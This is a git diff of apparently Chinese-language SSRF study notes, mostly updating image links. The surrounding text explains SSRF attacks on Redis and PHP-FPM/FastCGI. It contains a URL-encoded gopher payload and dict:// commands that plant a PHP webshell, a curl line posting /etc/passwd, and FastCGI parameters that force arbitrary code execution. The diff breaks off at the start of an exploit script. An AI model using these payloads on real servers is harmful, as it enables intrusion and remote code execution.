@@ -40,7 +40,7 @@ curl -F "file=@/etc/passwd" http://127.0.0.1
    file://文件绝对路径
    ```
 
-   ![](../daydayup.assets/image-20230716012047466.png)
+   ![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230716012047466.png)
 
 2. Gopher协议
 
@@ -74,7 +74,7 @@ curl -F "file=@/etc/passwd" http://127.0.0.1
 
 #### Gopher
 
-![](../daydayup.assets/1689445890678-9ea0f307-73ec-46e3-ae86-8755a0807333.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1689445890678-9ea0f307-73ec-46e3-ae86-8755a0807333.png)
 
 ```c
 gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0Agopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
@@ -82,13 +82,13 @@ gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0As
 
 payload需要再进行一次url编码
 
-![](../daydayup.assets/1689445973347-88b9dac1-ab6c-4188-9720-47a580066a91.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1689445973347-88b9dac1-ab6c-4188-9720-47a580066a91.png)
 
-![](../daydayup.assets/1689445992524-f1c3229a-1074-4b13-9fab-6b3a0573a1dd.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1689445992524-f1c3229a-1074-4b13-9fab-6b3a0573a1dd.png)
 
 #### dict
 
-![](../daydayup.assets/1689447145441-17d16e46-64e7-47b2-816d-01835b4399c2.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1689447145441-17d16e46-64e7-47b2-816d-01835b4399c2.png)
 
 >```
 >str="<?php system($_GET[\"a\"])?>";
@@ -115,7 +115,7 @@ dict://127.0.0.1:6379/save更改rdb文件的目录至网站目录下
 url=dict://127.0.0.1:6379/config:set:dir:/var/www/html
 ```
 
-![](../daydayup.assets/1689447203355-71caa4c3-6179-4e48-a9e3-18b68673f4c8.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1689447203355-71caa4c3-6179-4e48-a9e3-18b68673f4c8.png)
 
 ### SSRF打FastCGI
 
@@ -133,7 +133,7 @@ url=dict://127.0.0.1:6379/config:set:dir:/var/www/html
 
 [利用SSRF攻击内网FastCGI协议 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/263342.html)
 
-![](../daydayup.assets/image-20230715203751325.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/image-20230715203751325.png)
 
 https://blog.csdn.net/mysteryflower/article/details/94386461
 
@@ -177,11 +177,11 @@ type就是指定该record的作用。因为fastcgi一个record的大小是有限
 
 借用[该文章](https://blog.csdn.net/shreck66/article/details/50355729)中的一个表格，列出最主要的几种type：
 
-![](../daydayup.assets/1689422306195-674d037d-fdee-4e2b-aad9-25c4642fd954.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1689422306195-674d037d-fdee-4e2b-aad9-25c4642fd954.png)
 
 
 
-下图为php-fpm给web服务器传输的一个具体消息的消息头(8字节)内容![](../daydayup.assets/1689422757350-d1d8efd7-1c1c-4831-a5b3-d39fc7e10e8a.png)
+下图为php-fpm给web服务器传输的一个具体消息的消息头(8字节)内容![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1689422757350-d1d8efd7-1c1c-4831-a5b3-d39fc7e10e8a.png)
 
 1. 序列0(对应version字段)的数值为01，代表php-fpm的版本信息
 2. 序列1(对应type字段)的数值为03，根据上面对type值含义的解释，可以知道这个消息将标志这此次交互的结束
@@ -208,7 +208,7 @@ typedef struct
 
 根据上述可知type值为1的消息(标识开始请求)的消息的消息体为固定大小8字节，其中各个字段的具体含义如下
 
-- role:此字段占2个字节，用来说明我们对php-fpm发起请求时，我们想让php-fpm为我们扮演什么角色(做什么，或理解为杂么做)，其常见的3个取值如下:![](../daydayup.assets/1689423015583-dced4942-2ec6-4ce7-acd3-c3bb75d3cada.png)
+- role:此字段占2个字节，用来说明我们对php-fpm发起请求时，我们想让php-fpm为我们扮演什么角色(做什么，或理解为杂么做)，其常见的3个取值如下:![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1689423015583-dced4942-2ec6-4ce7-acd3-c3bb75d3cada.png)
 - flags:字段确定是否与php-fpm建立长连接，为1长连接，为0则在每次请求处理结束之后关闭连接
 - reserved:保留字段
 
@@ -238,7 +238,7 @@ typedef struct
 
 此值表示此消息体为传递PARAMS(环境参数)，环境参数其实就是name-value对，我们可以使用自己定义的name-value传给php-fpm或者传递php-fpm已有的name-value对，以下为我们后面实例将会使用到的php-fpm以有的name-value对如下
 
-![](../daydayup.assets/1689423449899-fc1b80a1-4e61-4e8a-bdc3-5addd25581ed.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1689423449899-fc1b80a1-4e61-4e8a-bdc3-5addd25581ed.png)
 
 消息体的格式如下
 
@@ -324,7 +324,7 @@ typedef struct {
 
 #### 完整消息record
 
-![](../daydayup.assets/1689423582373-16f2051e-9c9e-49f9-a701-6710e752ae90.png)
+![](https://github.com/wi1shu7/day_day_up/blob/main/daydayup.assets/1689423582373-16f2051e-9c9e-49f9-a701-6710e752ae90.png)
 
 #### PHP-FPM（FastCGI进程管理器）
 
@@ -357,7 +357,46 @@ FPM按照fastcgi的协议将TCP流解析成真正的数据。
 
 PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。
 
-##### EXP
+#### 任意代码执行
+
+那么，为什么我们控制fastcgi协议通信的内容，就能执行任意PHP代码呢？
+
+理论上当然是不可以的，即使我们能控制`SCRIPT_FILENAME`，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。
+
+但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，`auto_prepend_file`和`auto_append_file`。
+
+`auto_prepend_file`是告诉PHP，在执行目标文件之前，先包含`auto_prepend_file`中指定的文件；`auto_append_file`是告诉PHP，在执行完成目标文件后，包含`auto_append_file`指向的文件。
+
+那么就有趣了，假设我们设置`auto_prepend_file`为`php://input`，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项`allow_url_include`）
+
+那么，我们怎么设置`auto_prepend_file`的值？
+
+这又涉及到PHP-FPM的两个环境变量，`PHP_VALUE`和`PHP_ADMIN_VALUE`。这两个环境变量就是用来设置PHP配置项的，`PHP_VALUE`可以设置模式为`PHP_INI_USER`和`PHP_INI_ALL`的选项，`PHP_ADMIN_VALUE`可以设置所有选项。（`disable_functions`除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）
+
+```
+{
+    'GATEWAY_INTERFACE': 'FastCGI/1.0',
+    'REQUEST_METHOD': 'GET',
+    'SCRIPT_FILENAME': '/var/www/html/index.php',
+    'SCRIPT_NAME': '/index.php',
+    'QUERY_STRING': '?a=1&b=2',
+    'REQUEST_URI': '/index.php?a=1&b=2',
+    'DOCUMENT_ROOT': '/var/www/html',
+    'SERVER_SOFTWARE': 'php/fcgiclient',
+    'REMOTE_ADDR': '127.0.0.1',
+    'REMOTE_PORT': '12345',
+    'SERVER_ADDR': '127.0.0.1',
+    'SERVER_PORT': '80',
+    'SERVER_NAME': "localhost",
+    'SERVER_PROTOCOL': 'HTTP/1.1'
+    'PHP_VALUE': 'auto_prepend_file = php://input',
+    'PHP_ADMIN_VALUE': 'allow_url_include = On'
+}
+```
+
+设置`auto_prepend_file = php://input`且`allow_url_include = On`，然后将我们需要执行的代码放在Body中，即可执行任意代码。
+
+#### EXP
 
 ```python
 import socket
